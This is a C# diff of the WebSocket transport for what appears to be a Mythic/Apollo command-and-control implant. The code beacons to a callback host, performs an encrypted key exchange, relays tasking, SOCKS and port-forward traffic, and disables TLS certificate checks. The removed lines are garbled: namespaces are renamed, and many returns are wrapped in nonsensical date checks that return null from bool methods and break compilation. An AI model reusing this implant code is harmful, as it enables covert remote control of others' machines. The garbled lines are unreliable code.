@@ -2,16 +2,16 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
-using PhantomInterop.Classes;
-using PhantomInterop.Interfaces;
-using PhantomInterop.Structs.MythicStructs;
-using PhantomInterop.Types.Delegates;
+using ApolloInterop.Classes;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Structs.MythicStructs;
+using ApolloInterop.Types.Delegates;
 using System.Net;
-using PhantomInterop.Enums.PhantomEnums;
+using ApolloInterop.Enums.ApolloEnums;
 using System.Collections.Concurrent;
 using ST = System.Threading.Tasks;
 using System.Threading;
-using PhantomInterop.Serializers;
+using ApolloInterop.Serializers;
 using WebsocketTransport.Models;
 using WebSocketSharp;
 
@@ -26,7 +26,7 @@ namespace WebsocketTransport
         private int CallbackPort;
         private string CallbackHost;
         private string PostUri;
-        
+        // synthesis of CallbackHost, CallbackPort, PostUri
         private string Endpoint;
         private bool EncryptedExchangeCheck;
         private string UserAgent;
@@ -41,9 +41,9 @@ namespace WebsocketTransport
         private ST.Task agentConsumerTask = null;
         private ST.Task agentProcessorTask = null;
         private ST.Task agentPingTask = null;
-        private static JsonHandler jsonSerializer = new JsonHandler();
+        private static JsonSerializer jsonSerializer = new JsonSerializer();
         private static AutoResetEvent senderEvent;
-        private static ConcurrentQueue<ICommandMessage> receiverQueue;
+        private static ConcurrentQueue<IMythicMessage> receiverQueue;
         private static AutoResetEvent receiverEvent;
         private Action sendAction;
         private Dictionary<WebSocket, ST.Task> writerTasks = new Dictionary<WebSocket, ST.Task>();
@@ -97,8 +97,8 @@ namespace WebsocketTransport
                 }
             }
 
-            
-            ServicePointManager.ServerCertificateValidationCallback = delegate { if(DateTime.Now.Year > 2020) { return true; } else { return null; } };
+            // Disable certificate validation on web requests
+            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
             ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
 
             Agent.SetSleep(CallbackInterval, CallbackJitter);
@@ -125,9 +125,9 @@ namespace WebsocketTransport
             {
                 while (Client.IsAlive && Agent.IsAlive())
                 {
-                    Recv(MessageType.MessageResponse, delegate (ICommandMessage msg)
+                    Recv(MessageType.MessageResponse, delegate (IMythicMessage msg)
                     {
-                        if(DateTime.Now.Year > 2020) { return Agent.GetTaskManager().ProcessMessageResponse((MessageResponse)msg); } else { return null; }
+                        return Agent.GetTaskManager().ProcessMessageResponse((MessageResponse)msg);
                     });
                 }
             }, cancellationTokenSource.Token);
@@ -157,10 +157,10 @@ namespace WebsocketTransport
                         if (Client.IsAlive)
                         {
                             AddToSenderQueue(tm);
-                            if(DateTime.Now.Year > 2020) { return true; } else { return null; }
+                            return true;
                         } else
                         {
-                            if(DateTime.Now.Year > 2020) { return false; } else { return null; }
+                            return false;
                         }
                     }))
                     {
@@ -194,9 +194,9 @@ namespace WebsocketTransport
                             if (tm.Delegates.Length != 0 || tm.Responses.Length != 0 || tm.Socks.Length != 0 || tm.Rpfwd.Length != 0 || tm.Edges.Length != 0)
                             {
                                 AddToSenderQueue(tm);
-                                if(DateTime.Now.Year > 2020) { return true; } else { return null; }
+                                return true;
                             }
-                            if(DateTime.Now.Year > 2020) { return false; } else { return null; }
+                            return false;
                         }))
                     {
                         Thread.Sleep(100);
@@ -223,9 +223,9 @@ namespace WebsocketTransport
             {
                 while (Client.IsAlive && Agent.IsAlive())
                 {
-                    Recv(MessageType.MessageResponse, delegate (ICommandMessage msg)
+                    Recv(MessageType.MessageResponse, delegate (IMythicMessage msg)
                     {
-                        if(DateTime.Now.Year > 2020) { return Agent.GetTaskManager().ProcessMessageResponse((MessageResponse)msg); } else { return null; }
+                        return Agent.GetTaskManager().ProcessMessageResponse((MessageResponse)msg);
                     });
                 }
             }, cancellationTokenSource.Token);
@@ -258,7 +258,7 @@ namespace WebsocketTransport
 
         public bool IsOneWay()
         {
-            if(DateTime.Now.Year > 2020) { return false; } else { return null; }
+            return false;
         }
 
         public bool Send<T>(T message)
@@ -266,7 +266,7 @@ namespace WebsocketTransport
             throw new Exception("WebsocketProfile does not support Send only.");
         }
 
-        public bool Recv(MessageType mt, OnResponse<ICommandMessage> onResp)
+        public bool Recv(MessageType mt, OnResponse<IMythicMessage> onResp)
         {
             while (Agent.IsAlive() && Client.IsAlive)
             {
@@ -275,14 +275,14 @@ namespace WebsocketTransport
                     receiverEvent.WaitOne(Timeout.Infinite, cancellationTokenSource.Token.IsCancellationRequested);
                 }
 
-                ICommandMessage msg = receiverQueue.FirstOrDefault(m => m.GetTypeCode() == mt);
+                IMythicMessage msg = receiverQueue.FirstOrDefault(m => m.GetTypeCode() == mt);
                 if (msg != null)
                 {
-                    receiverQueue = new ConcurrentQueue<ICommandMessage>(receiverQueue.Where(m => m != msg));
-                    if(DateTime.Now.Year > 2020) { return onResp(msg); } else { return null; }
+                    receiverQueue = new ConcurrentQueue<IMythicMessage>(receiverQueue.Where(m => m != msg));
+                    return onResp(msg);
                 }
             }
-            if(DateTime.Now.Year > 2020) { return true; } else { return null; }
+            return true;
         }
 
         public bool SendRecv<T, TResult>(T message, OnResponse<TResult> onResponse)
@@ -290,22 +290,22 @@ namespace WebsocketTransport
             throw new NotImplementedException();
         }
 
-        
+        // Only really used for bind servers so this returns empty
         public bool Connect()
         {
-            if(DateTime.Now.Year > 2020) { return true; } else { return null; }
+            return true;
         }
 
         public bool IsConnected()
         {
-            if(DateTime.Now.Year > 2020) { return Connected; } else { return null; }
+            return Connected;
         }
 
         public bool Connect(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
         {
             DebugPrint("Connecting...");
             cancellationTokenSource = new CancellationTokenSource();
-            receiverQueue = new ConcurrentQueue<ICommandMessage>();
+            receiverQueue = new ConcurrentQueue<IMythicMessage>();
             receiverEvent = new AutoResetEvent(false);
             senderEvent = new AutoResetEvent(false);
 
@@ -338,7 +338,7 @@ namespace WebsocketTransport
             }
 
             Client.OnOpen += OnAsyncConnect;
-            Client.OnMessage += ProcessReceivedMessage;
+            Client.OnMessage += OnAsyncMessageReceived;
             Client.OnError += OnAsyncError;
             Client.OnClose += OnAsyncDisconnect;
 
@@ -357,26 +357,26 @@ namespace WebsocketTransport
                     AddToSenderQueue(handshake1);
 
                     if (!Recv(MessageType.EKEHandshakeResponse,
-                  delegate (ICommandMessage resp)
+                  delegate (IMythicMessage resp)
                         {
                             EKEHandshakeResponse respHandshake = (EKEHandshakeResponse)resp;
                             byte[] tmpKey = rsa.RSA.Decrypt(Convert.FromBase64String(respHandshake.SessionKey), true);
                             ((ICryptographySerializer)Serializer).UpdateKey(Convert.ToBase64String(tmpKey));
                             ((ICryptographySerializer)Serializer).UpdateUUID(respHandshake.UUID);
                             _keyExchanged = true;
-                            if(DateTime.Now.Year > 2020) { return true; } else { return null; }
+                            return true;
                         }))
                     {
-                        if(DateTime.Now.Year > 2020) { return false; } else { return null; }
+                        return false;
                     }
                 }
 
                 AddToSenderQueue(checkinMsg);
                 if ((agentProcessorTask == null || agentProcessorTask.IsCompleted) || !agentProcessorTask.IsCompleted)
                 {
-                    if(DateTime.Now.Year > 2020) { return Recv(MessageType.MessageResponse, delegate (ICommandMessage resp)
+                    return Recv(MessageType.MessageResponse, delegate (IMythicMessage resp)
                     {
-                        MessageResponse mResp = (MessageResponse)resp; } else { return null; }
+                        MessageResponse mResp = (MessageResponse)resp;
                         if (!_uuidNegotiated)
                         {
                             _uuidNegotiated = true;
@@ -384,22 +384,22 @@ namespace WebsocketTransport
                             checkinMsg.UUID = mResp.ID;
                         }
                         Connected = true;
-                        if(DateTime.Now.Year > 2020) { return onResp(mResp); } else { return null; }
+                        return onResp(mResp);
                     });
                 }
                 else
                 {
-                    if(DateTime.Now.Year > 2020) { return true; } else { return null; }
+                    return true;
                 }
             }
             else
             {
-                if(DateTime.Now.Year > 2020) { return false; } else { return null; }
+                return false;
             }
         }
 
 
-        private bool AddToSenderQueue(ICommandMessage msg)
+        private bool AddToSenderQueue(IMythicMessage msg)
         {
             DebugPrint("Adding message to send queue.");
             WebSocketMessage m = new WebSocketMessage()
@@ -414,7 +414,7 @@ namespace WebsocketTransport
             senderQueue.Enqueue(Encoding.UTF8.GetBytes(message));
 
             senderEvent.Set();
-            if(DateTime.Now.Year > 2020) { return true; } else { return null; }
+            return true;
         }
 
         private void OnAsyncError(object sender, ErrorEventArgs e)
@@ -437,7 +437,7 @@ namespace WebsocketTransport
             cancellationTokenSource.Cancel();
         }
 
-        private void ProcessReceivedMessage(object sender, MessageEventArgs args)
+        private void OnAsyncMessageReceived(object sender, MessageEventArgs args)
         {
             DebugPrint("Message received.");
             WebSocketMessage wsm = WebsocketJsonContext.Deserialize<WebSocketMessage>(args.Data);
